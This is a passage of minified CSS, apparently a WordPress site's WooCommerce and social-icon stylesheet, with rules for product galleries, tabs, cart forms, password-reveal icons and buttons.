.socicon{border-radius:100%}.social-icons-lists.icons-background-rounded .socicon{color:#fff}.social-icons-lists.icons-background-rounded.centre{padding:0;text-align:center}.widget .social-icons-lists.show-icons-label li.social-icons-list-item{display:block}.widget .social-icons-lists.show-icons-label.icons-background-rounded.centre{text-align:left}.woocommerce .woocommerce-error .button,.woocommerce .woocommerce-message .button{float:right}.woocommerce img{height:auto;max-width:100%}.woocommerce div.product div.images{float:left;width:48%}.woocommerce div.product div.thumbnails::after,.woocommerce div.product div.thumbnails::before{content:" ";display:table}.woocommerce div.product div.thumbnails::after{clear:both}.woocommerce div.product div.thumbnails a{float:left;width:30.75%;margin-right:3.8%;margin-bottom:1em}.woocommerce div.product div.thumbnails a.last{margin-right:0}.woocommerce div.product div.thumbnails a.first{clear:both}.woocommerce div.product div.thumbnails.columns-1 a{width:100%;margin-right:0;float:none}.woocommerce div.product div.thumbnails.columns-2 a{width:48%}.woocommerce div.product div.thumbnails.columns-4 a{width:22.05%}.woocommerce div.product div.thumbnails.columns-5 a{width:16.9%}.woocommerce div.product div.summary{float:right;width:48%;clear:none}.woocommerce div.product .woocommerce-tabs{clear:both}.woocommerce div.product .woocommerce-tabs ul.tabs::after,.woocommerce div.product .woocommerce-tabs ul.tabs::before{content:" ";display:table}.woocommerce div.product .woocommerce-tabs ul.tabs::after{clear:both}.woocommerce div.product .woocommerce-tabs ul.tabs li{display:inline-block}.woocommerce div.product #reviews .comment::after,.woocommerce div.product #reviews .comment::before{content:" ";display:table}.woocommerce div.product #reviews .comment::after{clear:both}.woocommerce div.product #reviews .comment img{float:right;height:auto}.woocommerce ul.products{clear:both}.woocommerce ul.products::after,.woocommerce ul.products::before{content:" ";display:table}.woocommerce ul.products::after{clear:both}.woocommerce ul.products li.product{float:left;margin:0 3.8% 2.992em 0;padding:0;position:relative;width:22.05%;margin-left:0}.woocommerce ul.products li.first{clear:both}.woocommerce ul.products li.last{margin-right:0}.woocommerce .woocommerce-ordering{float:right}.woocommerce #content table.cart img,.woocommerce table.cart img{height:auto}.woocommerce form .password-input{display:flex;flex-direction:column;justify-content:center;position:relative}.woocommerce form .password-input input[type=password]{padding-right:2.5rem}.woocommerce form .password-input input::-ms-reveal{display:none}.woocommerce form .show-password-input{background-color:transparent;border-radius:0;border:0;color:var(--wc-form-color-text,#000);cursor:pointer;font-size:inherit;line-height:inherit;margin:0;padding:0;position:absolute;right:.7em;text-decoration:none;top:50%;transform:translateY(-50%);-moz-osx-font-smoothing:inherit;-webkit-appearance:none;-webkit-font-smoothing:inherit}.woocommerce form .show-password-input::before{background-repeat:no-repeat;background-size:cover;background-image:url('data:image/svg+xml,<svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M17.3 3.3C16.9 2.9 16.2 2.9 15.7 3.3L13.3 5.7C12.2437 5.3079 11.1267 5.1048 10 5.1C6.2 5.2 2.8 7.2 1 10.5C1.2 10.9 1.5 11.3 1.8 11.7C2.6 12.8 3.6 13.7 4.7 14.4L3 16.1C2.6 16.5 2.5 17.2 3 17.7C3.4 18.1 4.1 18.2 4.6 17.7L17.3 4.9C17.7 4.4 17.7 3.7 17.3 3.3ZM6.7 12.3L5.4 13.6C4.2 12.9 3.1 11.9 2.3 10.7C3.5 9 5.1 7.8 7 7.2C5.7 8.6 5.6 10.8 6.7 12.3ZM10.1 9C9.6 8.5 9.7 7.7 10.2 7.2C10.7 6.8 11.4 6.8 11.9 7.2L10.1 9ZM18.3 9.5C17.8 8.8 17.2 8.1 16.5 7.6L15.5 8.6C16.3 9.2 17 9.9 17.6 10.8C15.9 13.4 13 15 9.9 15H9.1L8.1 16C8.8 15.9 9.4 16 10 16C13.3 16 16.4 14.4 18.3 11.7C18.6 11.3 18.8 10.9 19.1 10.5C18.8 10.2 18.6 9.8 18.3 9.5ZM14 10L10 14C12.2 14 14 12.2 14 10Z" fill="%23111111"/></svg>');content:"";display:block;height:22px;width:22px}.woocommerce form .show-password-input.display-password::before{background-image:url('data:image/svg+xml,<svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M18.3 9.49999C15 4.89999 8.50002 3.79999 3.90002 7.19999C2.70002 8.09999 1.70002 9.29999 0.900024 10.6C1.10002 11 1.40002 11.4 1.70002 11.8C5.00002 16.4 11.3 17.4 15.9 14.2C16.8 13.5 17.6 12.8 18.3 11.8C18.6 11.4 18.8 11 19.1 10.6C18.8 10.2 18.6 9.79999 18.3 9.49999ZM10.1 7.19999C10.6 6.69999 11.4 6.69999 11.9 7.19999C12.4 7.69999 12.4 8.49999 11.9 8.99999C11.4 9.49999 10.6 9.49999 10.1 8.99999C9.60003 8.49999 9.60003 7.69999 10.1 7.19999ZM10 14.9C6.90002 14.9 4.00002 13.3 2.30002 10.7C3.50002 8.99999 5.10002 7.79999 7.00002 7.19999C6.30002 7.99999 6.00002 8.89999 6.00002 9.89999C6.00002 12.1 7.70002 14 10 14C12.2 14 14.1 12.3 14.1 9.99999V9.89999C14.1 8.89999 13.7 7.89999 13 7.19999C14.9 7.79999 16.5 8.99999 17.7 10.7C16 13.3 13.1 14.9 10 14.9Z" fill="%23111111"/></svg>')}.woocommerce #payment .terms{text-align:left;padding:0 1em 0 0;float:left}.woocommerce #payment #place_order{float:right}:root{--woocommerce:#720eec;--wc-green:#7ad03a;--wc-red:#a00;--wc-orange:#ffba00;--wc-blue:#2ea2cc;--wc-primary:#720eec;--wc-primary-text:#fcfbfe;--wc-secondary:#e9e6ed;--wc-secondary-text:#515151;--wc-highlight:#958e09;--wc-highligh-text:white;--wc-content-bg:#fff;--wc-subtext:#767676;--wc-form-border-color:rgba(32, 7, 7, .8);--wc-form-border-radius:4px;--wc-form-border-width:1px}@keyframes spin{100%{transform:rotate(360deg)}}.woocommerce form .form-row.woocommerce-invalid .select2-container:not(.select2-container--open) .select2-selection{border-color:var(--wc-red)}.woocommerce form .form-row.woocommerce-validated .select2-container:not(.select2-container--open) .select2-selection{border-color:var(--wc-green)}.select2-container{width:100%}.select2-container .select2-selection--single{height:auto}.select2-container .select2-selection--single .select2-selection__rendered{padding:.5em;line-height:normal;box-sizing:border-box;color:var(--wc-form-color-text,#444);font-weight:400}.select2-container .select2-selection--single .select2-selection__placeholder{color:#999}.select2-container .select2-selection--single .select2-selection__arrow{position:absolute;top:2px;right:.5em;height:100%;width:16px}.select2-container .select2-selection--single .select2-selection__arrow b{border:none;display:block;background:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJmZWF0aGVyIGZlYXRoZXItY2hldnJvbi1kb3duIj48cG9seWxpbmUgcG9pbnRzPSI2IDkgMTIgMTUgMTggOSI+PC9wb2x5bGluZT48L3N2Zz4=) no-repeat;background-size:16px;width:16px;height:16px;position:absolute;top:50%;left:0;margin:-8px 0 0}.select2-container .select2-dropdown,.select2-container .select2-selection{background-color:var(--wc-form-color-background,#fff);border:var(--wc-form-border-width,1px) solid var(--wc-form-border-color,#aaa);border-radius:var(--wc-form-border-radius,4px)}.select2-container.select2-container--open .select2-dropdown--above{border-bottom:none;border-bottom-left-radius:0;border-bottom-right-radius:0}.select2-container.select2-container--open .select2-dropdown--below{border-top:none;border-top-left-radius:0;border-top-right-radius:0}.select2-results__option{margin:0}.woocommerce-store-notice{position:absolute;top:0;left:0;right:0;margin:0;width:100%;font-size:1em;padding:1em 0;text-align:center;background-color:#720eec;color:#fcfbfe;z-index:99998;box-shadow:0 1px 1em rgba(0,0,0,.2);display:none}.woocommerce-store-notice a{color:#fcfbfe;text-decoration:underline}.clear{clear:both}.woocommerce .blockUI.blockOverlay{position:relative}.woocommerce .blockUI.blockOverlay::before{height:1em;width:1em;display:block;position:absolute;top:50%;left:50%;margin-left:-.5em;margin-top:-.5em;content:"";animation:1s ease-in-out infinite spin;background:url(https://cdn.learnwoo.com/wp-content/plugins/woocommerce/assets/images/icons/loader.svg) center center;background-size:cover;line-height:1;text-align:center;font-size:2em;color:rgba(0,0,0,.75)}.woocommerce .loader::before{height:1em;width:1em;display:block;position:absolute;top:50%;left:50%;margin-left:-.5em;margin-top:-.5em;content:"";animation:1s ease-in-out infinite spin;background:url(https://cdn.learnwoo.com/wp-content/plugins/woocommerce/assets/images/icons/loader.svg) center center;background-size:cover;line-height:1;text-align:center;font-size:2em;color:rgba(0,0,0,.75)}.woocommerce a.remove{display:block;font-size:1.5em;height:1em;width:1em;text-align:center;line-height:1;border-radius:100%;color:var(--wc-red)!important;text-decoration:none;font-weight:700;border:0}.woocommerce a.remove:hover{color:#fff!important;background:var(--wc-red)}.woocommerce .quantity .qty{width:3.631em;text-align:center}.woocommerce div.product{margin-bottom:0;position:relative}.woocommerce div.product .product_title{clear:none;margin-top:0;padding:0}.woocommerce div.product p.price ins,.woocommerce div.product span.price ins{background:inherit;font-weight:700;display:inline-block}.woocommerce div.product p.price del,.woocommerce div.product span.price del{opacity:.5;display:inline-block}.woocommerce div.product p.stock{font-size:.92em}.woocommerce div.product .woocommerce-product-rating{margin-bottom:1.618em}.woocommerce div.product div.images{margin-bottom:2em}.woocommerce div.product div.images img{display:block;width:100%;height:auto;box-shadow:none}.woocommerce div.product div.images div.thumbnails{padding-top:1em}.woocommerce div.product div.images.woocommerce-product-gallery{position:relative}.woocommerce div.product div.images .woocommerce-product-gallery__wrapper{transition:all cubic-bezier(.795,-.035,0,1) .5s;margin:0;padding:0}.woocommerce div.product div.images .woocommerce-product-gallery__wrapper .zoomImg{background-color:#fff;opacity:0}.woocommerce div.product div.images .woocommerce-product-gallery__image--placeholder{border:1px solid #f2f2f2}.woocommerce div.product div.images .woocommerce-product-gallery__image:nth-child(n+2){width:25%;display:inline-block}.woocommerce div.product div.images .woocommerce-product-gallery__image a{display:block;outline-offset:-2px}.woocommerce div.product div.images .woocommerce-product-gallery__trigger{background:#fff;border:none;box-sizing:content-box;border-radius:100%;cursor:pointer;font-size:2em;height:36px;padding:0;position:absolute;right:.5em;text-indent:-9999px;top:.5em;width:36px;z-index:99}.woocommerce div.product div.images .woocommerce-product-gallery__trigger::before{border:2px solid #000;border-radius:100%;box-sizing:content-box;content:"";display:block;height:10px;left:9px;top:9px;position:absolute;width:10px}.woocommerce div.product div.images .woocommerce-product-gallery__trigger::after{background:#000;border-radius:6px;box-sizing:content-box;content:"";display:block;height:8px;left:22px;position:absolute;top:19px;transform:rotate(-45deg);width:2px}.woocommerce div.product div.images .woocommerce-product-gallery__trigger span[aria-hidden=true]{border:0;clip-path:inset(50%);height:1px;left:50%;margin:-1px;overflow:hidden;position:absolute;top:50%;width:1px}.woocommerce div.product div.images .flex-control-thumbs{overflow:hidden;zoom:1;margin:0;padding:0}.woocommerce div.product div.images .flex-control-thumbs li{width:25%;float:left;margin:0;list-style:none}.woocommerce div.product div.images .flex-control-thumbs li img{cursor:pointer;opacity:.5;margin:0}.woocommerce div.product div.images .flex-control-thumbs li img.flex-active,.woocommerce div.product div.images .flex-control-thumbs li img:hover{opacity:1}.woocommerce div.product .woocommerce-product-gallery--columns-3 .flex-control-thumbs li:nth-child(3n+1){clear:left}.woocommerce div.product .woocommerce-product-gallery--columns-4 .flex-control-thumbs li:nth-child(4n+1){clear:left}.woocommerce div.product .woocommerce-product-gallery--columns-5 .flex-control-thumbs li:nth-child(5n+1){clear:left}.woocommerce div.product div.summary{margin-bottom:2em}.woocommerce div.product div.social{text-align:right;margin:0 0 1em}.woocommerce div.product div.social span{margin:0 0 0 2px}.woocommerce div.product div.social span span{margin:0}.woocommerce div.product div.social span .stButton .chicklets{padding-left:16px;width:0}.woocommerce div.product div.social iframe{float:left;margin-top:3px}.woocommerce div.product .woocommerce-tabs ul.tabs{list-style:none;padding:0 0 0 1em;margin:0 0 1.618em;overflow:hidden;position:relative}.woocommerce div.product .woocommerce-tabs ul.tabs li{border:1px solid #cfc8d8;background-color:#e9e6ed;color:#515151;display:inline-block;position:relative;z-index:0;border-radius:4px 4px 0 0;margin:0 -5px;padding:0 1em}.woocommerce div.product .woocommerce-tabs ul.tabs li a{display:inline-block;padding:.5em 0;font-weight:700;color:#515151;text-decoration:none}.woocommerce div.product .woocommerce-tabs ul.tabs li a:hover{text-decoration:none;color:#6b6b6b}.woocommerce div.product .woocommerce-tabs ul.tabs li.active{background:#fff;color:#515151;z-index:2;border-bottom-color:#fff}.woocommerce div.product .woocommerce-tabs ul.tabs li.active a{color:inherit;text-shadow:inherit}.woocommerce div.product .woocommerce-tabs ul.tabs li.active::before{box-shadow:2px 2px 0 #fff}.woocommerce div.product .woocommerce-tabs ul.tabs li.active::after{box-shadow:-2px 2px 0 #fff}.woocommerce div.product .woocommerce-tabs ul.tabs li::after,.woocommerce div.product .woocommerce-tabs ul.tabs li::before{border:1px solid #cfc8d8;position:absolute;bottom:-1px;width:5px;height:5px;content:" ";box-sizing:border-box}.woocommerce div.product .woocommerce-tabs ul.tabs li::before{left:-5px;border-bottom-right-radius:4px;border-width:0 1px 1px 0;box-shadow:2px 2px 0 #e9e6ed}.woocommerce div.product .woocommerce-tabs ul.tabs li::after{right:-5px;border-bottom-left-radius:4px;border-width:0 0 1px 1px;box-shadow:-2px 2px 0 #e9e6ed}.woocommerce div.product .woocommerce-tabs ul.tabs::before{position:absolute;content:" ";width:100%;bottom:0;left:0;border-bottom:1px solid #cfc8d8;z-index:1}.woocommerce div.product .woocommerce-tabs .panel{margin:0 0 2em;padding:0}.woocommerce div.product p.cart{margin-bottom:2em}.woocommerce div.product p.cart::after,.woocommerce div.product p.cart::before{content:" ";display:table}.woocommerce div.product p.cart::after{clear:both}.woocommerce div.product form.cart{margin-bottom:2em}.woocommerce div.product form.cart::after,.woocommerce div.product form.cart::before{content:" ";display:table}.woocommerce div.product form.cart::after{clear:both}.woocommerce div.product form.cart div.quantity{float:left;margin:0 4px 0 0}.woocommerce div.product form.cart table{border-width:0 0 1px}.woocommerce div.product form.cart table td{padding-left:0}.woocommerce div.product form.cart table div.quantity{float:none;margin:0}.woocommerce div.product form.cart table small.stock{display:block;float:none}.woocommerce div.product form.cart .variations{margin-bottom:1em;border:0;width:100%}.woocommerce div.product form.cart .variations td,.woocommerce div.product form.cart .variations th{border:0;line-height:2em;vertical-align:top}.woocommerce div.product form.cart .variations label{font-weight:700;text-align:left}.woocommerce div.product form.cart .variations select{max-width:100%;min-width:75%;display:inline-block;margin-right:1em;appearance:none;-webkit-appearance:none;-moz-appearance:none;padding-right:3em;background:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJmZWF0aGVyIGZlYXRoZXItY2hldnJvbi1kb3duIj48cG9seWxpbmUgcG9pbnRzPSI2IDkgMTIgMTUgMTggOSI+PC9wb2x5bGluZT48L3N2Zz4=) no-repeat;background-size:16px;-webkit-background-size:16px;background-position:calc(100% - 12px) 50%;-webkit-background-position:calc(100% - 12px) 50%}.woocommerce div.product form.cart .variations td.label{padding-right:1em}.woocommerce div.product form.cart .woocommerce-variation-description p{margin-bottom:1em}.woocommerce div.product form.cart .reset_variations{visibility:hidden;font-size:.83em}.woocommerce div.product form.cart .wc-no-matching-variations{display:none}.woocommerce div.product form.cart .button{vertical-align:middle;float:left}.woocommerce div.product form.cart .group_table td.woocommerce-grouped-product-list-item__label{padding-right:1em;padding-left:1em}.woocommerce div.product form.cart .group_table td{vertical-align:top;padding-bottom:.5em;border:0}.woocommerce div.product form.cart .group_table td:first-child{width:4em;text-align:center}.woocommerce div.product form.cart .group_table .wc-grouped-product-add-to-cart-checkbox{display:inline-block;width:auto;margin:0 auto;transform:scale(1.5,1.5)}.woocommerce .products ul,.woocommerce ul.products{margin:0 0 1em;padding:0;list-style:none;clear:both}.woocommerce .products ul::after,.woocommerce .products ul::before,.woocommerce ul.products::after,.woocommerce ul.products::before{content:" ";display:table}.woocommerce .products ul::after,.woocommerce ul.products::after{clear:both}.woocommerce .products ul li,.woocommerce ul.products li{list-style:none}.woocommerce ul.products li.product h3{padding:.5em 0;margin:0;font-size:1em}.woocommerce ul.products li.product a{text-decoration:none}.woocommerce ul.products li.product a img{width:100%;height:auto;display:block;margin:0 0 1em;box-shadow:none}.woocommerce ul.products li.product strong{display:block}.woocommerce ul.products li.product .button{display:inline-block;margin-top:1em}.woocommerce ul.products li.product .price{display:block;font-weight:400;margin-bottom:.5em;font-size:.857em}.woocommerce ul.products li.product .price del{color:inherit;opacity:.5;display:inline-block}.woocommerce ul.products li.product .price .from{font-size:.67em;margin:-2px 0 0;text-transform:uppercase;color:rgba(90,89,68,.5)}.woocommerce .woocommerce-ordering{margin:0 0 1em}.woocommerce .woocommerce-ordering>label{margin-right:.25rem}.woocommerce .woocommerce-ordering select{vertical-align:top}.woocommerce .cart .button,.woocommerce .cart input.button{float:none}.woocommerce form.login,.woocommerce form.register{border:1px solid #cfc8d8;padding:20px;margin:2em 0;text-align:left;border-radius:5px}.woocommerce ul#shipping_method{list-style:none;margin:0;padding:0}.woocommerce ul#shipping_method li{margin:0 0 .5em;line-height:1.5em;list-style:none}.woocommerce ul#shipping_method li input{margin:3px .4375em 0 0;vertical-align:top}.woocommerce ul#shipping_method li label{display:inline}.woocommerce ul#shipping_method .amount{font-weight:700}.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) a.button,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) button.button,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) input.button,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button{font-size:100%;margin:0;line-height:1;cursor:pointer;position:relative;text-decoration:none;overflow:visible;padding:.618em 1em;font-weight:700;border-radius:3px;left:auto;color:#515151;background-color:#e9e6ed;border:0;display:inline-block;background-image:none;box-shadow:none;text-shadow:none}.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) a.button.loading,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) button.button.loading,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) input.button.loading,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit.loading,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button.loading,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button.loading,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button.loading{opacity:.25;padding-right:2.618em}.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) a.button.loading::after,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) button.button.loading::after,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) input.button.loading::after,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit.loading::after,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button.loading::after,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button.loading::after,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button.loading::after{font-family:WooCommerce;content:"\e01c";vertical-align:top;font-weight:400;position:absolute;top:.618em;right:1em;animation:2s linear infinite spin}.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) a.button.added::after,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) button.button.added::after,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) input.button.added::after,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit.added::after,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button.added::after,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button.added::after,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button.added::after{font-family:WooCommerce;content:"\e017";margin-left:.53em;vertical-align:bottom}.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) a.button:hover,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) button.button:hover,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) input.button:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button:hover{background-color:#dcd7e2;text-decoration:none;background-image:none;color:#515151}:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit.alt,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button.alt,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button.alt,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button.alt{background-color:#7f54b3;color:#fff;-webkit-font-smoothing:antialiased}:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit.alt:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button.alt:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button.alt:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button.alt:hover{background-color:#7249a4;color:#fff}.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) #respond input#submit.alt.disabled,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) #respond input#submit.alt.disabled:hover,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) a.button.alt.disabled,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) a.button.alt.disabled:hover,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) button.button.alt.disabled,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) button.button.alt.disabled:hover,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) input.button.alt.disabled,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) input.button.alt.disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit.alt.disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit.alt.disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit.alt:disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit.alt:disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit.alt:disabled[disabled],:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit.alt:disabled[disabled]:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button.alt.disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button.alt.disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button.alt:disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button.alt:disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button.alt:disabled[disabled],:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button.alt:disabled[disabled]:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button.alt.disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button.alt.disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button.alt:disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button.alt:disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button.alt:disabled[disabled],:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button.alt:disabled[disabled]:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button.alt.disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button.alt.disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button.alt:disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button.alt:disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button.alt:disabled[disabled],:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button.alt:disabled[disabled]:hover{background-color:#7f54b3;color:#fff}.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) #respond input#submit.disabled,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) a.button.disabled,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) a.button:disabled,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) a.button:disabled[disabled],.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) button.button.disabled,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) button.button:disabled,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) button.button:disabled[disabled],.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) input.button.disabled,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) input.button:disabled,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) input.button:disabled[disabled],:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit.disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit:disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit:disabled[disabled],:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button.disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button:disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button:disabled[disabled],:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button.disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button:disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button:disabled[disabled],:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button.disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button:disabled,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button:disabled[disabled]{color:inherit;cursor:not-allowed;opacity:.5;padding:.618em 1em}.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) #respond input#submit.disabled:hover,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) a.button.disabled:hover,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) a.button:disabled:hover,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) a.button:disabled[disabled]:hover,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) 